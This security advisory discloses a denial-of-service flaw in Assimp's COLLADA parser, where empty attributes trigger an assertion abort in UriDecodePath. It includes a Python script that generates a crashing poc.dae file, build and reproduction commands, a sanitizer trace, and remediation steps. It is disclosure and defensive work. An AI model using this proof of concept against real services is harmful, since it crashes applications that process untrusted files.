Assertion failure (SIGABRT) via empty attributes in COLLADA files (UriDecodePath)

## Summary

An assertion failure (`SIGABRT`) in `ColladaParser::UriDecodePath()` allows denial of service when Assimp processes a COLLADA file with empty attributes on image, effect, material, and geometry elements.

## Tested Version

- Latest release: v6.0.4
- Latest master: commit `158da575` (April 6, 2026)

## Details

When a COLLADA file contains empty `id=""` and `url=""` attributes, the Collada loader processes them without validation. The crash occurs in `ColladaParser::UriDecodePath()` at `code/AssetLib/Collada/ColladaParser.cpp:556`:

```cpp
void ColladaParser::UriDecodePath(aiString& ss) {
    char *out = ss.data;
    for (const char *it = ss.data; it != ss.data + ss.length; /**/) {
        // ... decode loop (skipped entirely when ss.length == 0)
    }
    *out = 0;
    ai_assert(out > ss.data);  // FAILS: out == ss.data when input is empty
    ss.length = static_cast<ai_uint32>(out - ss.data);
}
```

When `<init_from>` contains an empty string, `ss.length` is 0, the decode loop body never executes, `out` remains equal to `ss.data`, and the assertion `out > ss.data` fails, triggering `SIGABRT`.

The full crash call chain is:
```
ColladaParser::ReadStructure()
  → ReadImageLibrary()
    → ReadImage() (ColladaParser.cpp:950)
      → UriDecodePath() (ColladaParser.cpp:556) — ai_assert fails
        → defaultAiAssertHandler() → abort() → raise(SIGABRT)
```

## PoC

1. Run the following generator script to create the PoC:
```python
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def make_collada_empty_attrs():
    xml = '<?xml version="1.0"?>\n'
    xml += '<COLLADA xmlns="http://www.collada.org/2005/11/COLLADASchema" version="1.4.1">\n'
    xml += '<library_images>\n'
    xml += '  <image id="" name="test"><init_from></init_from></image>\n'
    xml += '</library_images>\n'
    xml += '<library_effects>\n'
    xml += '  <effect id="" name="test"><profile_COMMON>\n'
    xml += '    <newparam sid=""><surface type="2D"><init_from></init_from></surface></newparam>\n'
    xml += '    <technique sid=""><lambert><diffuse><texture texture="" texcoord=""/></diffuse></lambert></technique>\n'
    xml += '  </profile_COMMON></effect>\n'
    xml += '</library_effects>\n'
    xml += '<library_materials>\n'
    xml += '  <material id="" name="test"><instance_effect url=""/></material>\n'
    xml += '</library_materials>\n'
    xml += '<library_geometries>\n'
    xml += '  <geometry id="" name="test"><mesh>\n'
    xml += '    <source id=""><float_array id="" count="0"></float_array></source>\n'
    xml += '    <vertices id=""><input semantic="POSITION" source=""/></vertices>\n'
    xml += '    <triangles count="0"><input semantic="VERTEX" source="" offset="0"/></triangles>\n'
    xml += '  </mesh></geometry>\n'
    xml += '</library_geometries>\n'
    xml += '<library_visual_scenes><visual_scene id="s"><node id="" name="" type="NODE">\n'
    xml += '  <instance_geometry url=""/>\n'
    xml += '</node></visual_scene></library_visual_scenes>\n'
    xml += '<scene><instance_visual_scene url="#s"/></scene>\n'
    xml += '</COLLADA>\n'

    out_path = os.path.join(OUT, "poc.dae")
    with open(out_path, "wb") as f:
        f.write(xml.encode())
    print(f"Written {len(xml)} bytes to {out_path}")


if __name__ == "__main__":
    make_collada_empty_attrs()
```
   
This produces `poc.dae`, a COLLADA file with empty `id=""` and `url=""` attributes across image, effect, material, geometry, and node elements, plus an empty `<init_from></init_from>`.

2. Feed `poc.dae` to any application that uses Assimp to import COLLADA files.

```bash
# Option A: Build the CLI tool (no sanitizer — crashes as SIGABRT)
cmake -B build -DASSIMP_BUILD_ASSIMP_TOOLS=ON -DASSIMP_BUILD_TESTS=OFF
cmake --build build -j$(nproc)
./build/bin/assimp info poc.dae     # → ai_assert failure → Aborted

# Option B: Build with ASan for a cleaner trace
cmake -B build-asan -DCMAKE_C_FLAGS="-fsanitize=address" -DCMAKE_CXX_FLAGS="-fsanitize=address" \
      -DASSIMP_BUILD_ASSIMP_TOOLS=ON -DASSIMP_BUILD_TESTS=OFF
cmake --build build-asan -j$(nproc)
./build-asan/bin/assimp info poc.dae  # → AddressSanitizer: ABRT
```

No special build configuration is required. With AddressSanitizer enabled, the crash is:

```
ai_assert failure in ColladaParser.cpp(556): out > ss.data
==7==ERROR: AddressSanitizer: ABRT on unknown address 0x000000000007
    #0 raise (/lib/.../libc.so.6)
    #1 abort (/lib/.../libc.so.6)
    #2 Assimp::defaultAiAssertHandler(...) AssertHandler.cpp:53
    #3 Assimp::ColladaParser::UriDecodePath(...) ColladaParser.cpp:556
    #4 Assimp::ColladaParser::ReadImage(...) ColladaParser.cpp:950
    #5 Assimp::ColladaParser::ReadImageLibrary(...) ColladaParser.cpp:928
    #6 Assimp::ColladaParser::ReadStructure(...) ColladaParser.cpp:597
```

## Impact

Denial of Service. Any application using Assimp to load untrusted COLLADA files can be crashed with a small (1.1 KB) input.
Also crashes without sanitizers as a real `SIGABRT` because `ai_assert` calls `abort()` unconditionally.

## Remediation

In `UriDecodePath()`, check for an empty input string before the decode loop and return early. Additionally, validate that required string attributes (`id`, `url`, `sid`) are non-empty when read, rather than assuming they contain data.